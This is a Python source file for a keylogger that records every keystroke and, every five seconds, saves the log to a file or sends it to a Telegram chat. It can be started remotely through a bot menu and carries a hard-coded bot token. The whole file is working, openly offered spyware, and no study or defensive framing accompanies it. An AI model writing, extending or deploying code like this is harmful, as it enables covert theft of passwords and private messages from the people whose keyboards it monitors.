import keyboard
from threading import Timer
from datetime import datetime
import telebot
from telebot import types

# Replace with your Telegram bot token
bot = telebot.TeleBot("7685898509:AAFAB5xh6CCT4IfoGLlolJL97yWUrVOaKjEgj")

# Interval for saving reports in seconds
SEND_REPORT_EVERY = 5

class Keylogger:
    def __init__(self, report_method, chat_id=None):
        self.chat_id = chat_id  # Chat ID for sending logs via Telegram
        self.report_method = report_method  # Reporting method: 'telegram' or 'file'
        self.interval = SEND_REPORT_EVERY  # Report interval
        self.log = ""  # String to store logged keystrokes
        self.start_time = datetime.now()  # Start time for logging
        self.end_time = datetime.now()  # End time for the current log

    def callback(self, event):
        """Capture keystrokes and format them."""
        name = event.name
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            name = f"[{name.upper()}]"
        self.log += name

    def update_file_name(self):
        """Generate a unique filename for the log."""
        start_dt_str = str(self.start_time)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_time)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog--{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """Save the log to a file."""
        with open(f"{self.filename}.txt", "w") as f:
            f.write(self.log)
        print(f"Log saved to {self.filename}.txt")

    def send_bot(self, message):
        """Send the log to the user via Telegram."""
        if self.chat_id:
            bot.send_message(self.chat_id, message)

    def report(self):
        """Generate and send the report based on the selected method."""
        if self.log:
            self.end_time = datetime.now()
            self.update_file_name()
            if self.report_method == 'telegram':
                self.send_bot(self.log)
            elif self.report_method == 'file':
                self.report_to_file()
            self.start_time = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start_logging(self):
        """Start the keylogger."""
        self.start_time = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


@bot.message_handler(commands=['start'])
def start_bot(message):
    """Send inline keyboard options to the user."""
    markup = types.InlineKeyboardMarkup()
    telegram_option = types.InlineKeyboardButton(text='Send logs to Telegram', callback_data='start_keylogger_tg')
    file_option = types.InlineKeyboardButton(text='Save logs to a file', callback_data='start_keylogger_file')
    markup.add(telegram_option, file_option)
    bot.send_message(message.chat.id,
                     "Select how you want to start the keylogger:",
                     reply_markup=markup)


@bot.callback_query_handler(func=lambda call: True)
def callback_worker(call):
    """Handle button clicks from the inline keyboard."""
    if call.data == 'start_keylogger_tg':
        keylogger = Keylogger(report_method="telegram", chat_id=call.from_user.id)
        keylogger.start_logging()  # Changed method name here
    elif call.data == 'start_keylogger_file':
        keylogger = Keylogger(report_method="file")
        keylogger.start_logging()  # Changed method name here


# Start the Telegram bot
bot.polling()
